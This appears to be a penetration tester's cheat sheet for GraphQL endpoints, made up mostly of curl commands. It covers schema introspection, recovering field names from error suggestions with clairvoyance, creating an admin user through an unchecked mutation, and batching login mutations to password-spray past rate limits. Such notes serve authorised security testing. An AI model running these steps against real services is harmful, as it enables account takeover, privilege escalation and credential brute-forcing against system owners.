# GraphQL checks

## Schema / introspection
```bash
curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'
```
- Query the same object as two users; schema visibility ≠ data access.
- Try `/graphiql`, `/v1/graphql` if the app hints at them.

## Introspection disabled: field suggestions
Many servers suggest a close field name in the error message even with introspection off — brute-forcing field names this way recovers the schema piece by piece:
```bash
curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{usr{id}}"}'
# error mentions "usr" and suggests "user" → real field name found
```
```bash
pip install clairvoyance
clairvoyance http://<IP>/graphql -o schema.json
clairvoyance http://<IP>/graphql -o schema.json -H 'Authorization: Bearer <TOKEN>'
```
- `clairvoyance` automates the same error-message brute force with its own field/argument wordlist; takes minutes on a typical schema. `-H` is repeatable for auth headers; `-x` to proxy through Burp.

## Mutations
List mutations the same way as queries, then call one:
```bash
curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{mutationType{fields{name args{name type{name}}}}}}"}'
curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
  -d '{"query":"mutation{createUser(username:\"<LOCAL-USER>\",password:\"<PW>\",role:\"admin\"){id}}"}'
```
- Mutations often skip the authz check that the matching query enforces — test a privileged mutation as a low-privilege user even if the equivalent read is denied.

## Batching
Send an array of operations in one POST; some rate limits and WAF rules count requests, not operations inside one:
```bash
curl -s http://<IP>/graphql -H 'Content-Type: application/json' \
  -d '[{"query":"{__typename}"},{"query":"mutation{login(user:\"admin\",pass:\"<PW1>\"){token}}"},{"query":"mutation{login(user:\"admin\",pass:\"<PW2>\"){token}}"}]'
```
- Useful for password-spraying a `login` mutation past a per-request rate limit, and for stacking an authz-bypass query alongside a normal one to see if batched context differs.
